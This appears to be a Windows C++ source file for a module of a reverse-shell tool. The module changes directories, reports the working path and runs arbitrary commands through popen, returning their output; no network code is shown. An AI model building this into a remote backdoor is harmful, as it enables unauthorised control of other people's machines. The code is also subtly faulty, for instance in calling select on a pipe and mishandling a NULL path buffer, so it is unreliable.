#include <iostream>
#include <winsock2.h>
#include <cstdio>
#include <windows.h>
#include <direct.h> //_chdir
#include <fcntl.h>

#include "../inc/ModShell.h"
#include "../inc/common.h"

using namespace std;


ModShell::ModShell()
{
    //Take care of all the reverse shell part.
    ;
}
int ModShell::changeDirectory(string path)
{
//    cout << path.substr(3,path.length()) << endl;
    if(_chdir((path.substr(3,path.length())).c_str())!=0)
    {
        return 1;
    }

    return 0;
}
string ModShell::getPath()
{
    char* buffer;
   // Get the current working directory:
    if ( (buffer = _getcwd( NULL, 0 )) == NULL )
        ;
    string path = buffer;
    return path;
}

int ModShell::exec(string command,string &result)
{
    char buffer[1024];
    timeval timeout;

    timeout.tv_sec = TIMEOUT_POPEN;
    timeout.tv_usec = 0;

    struct fd_set fds;

    FILE* pipe = popen(command.c_str(), "rt");

    if (!pipe) 
    { 
        ///popen fail;
        return 1;
        //return "popen failed!";
    }
    // read till end of process:
    
    FD_ZERO(&fds);
    FD_SET(_fileno(pipe), &fds);
    cout << "PIPE : "<< _fileno(pipe) << endl;
    int selectPopen = select(_fileno(pipe)+1, &fds, 0, 0, &timeout);
    cout << "select Popen "<< selectPopen << endl;
    if(selectPopen > 0)
    {
        while (!feof(pipe)) 
        {   memset(buffer,0,sizeof(buffer));
            // use buffer to read and add to result
            if (fgets(buffer, sizeof(buffer), pipe) != NULL)
            {
                result.append(buffer,strlen(buffer));
            }
        }
        pclose(pipe);
    }
    else if(selectPopen == 0)
    {
        cout << "TIMEOUT POPEN " << endl;
        pclose(pipe);
    }
    else
    {
        cout << "ERROR in select" << endl;
    }
    //cout << "Mod shell finish " << endl;
    return 0;
}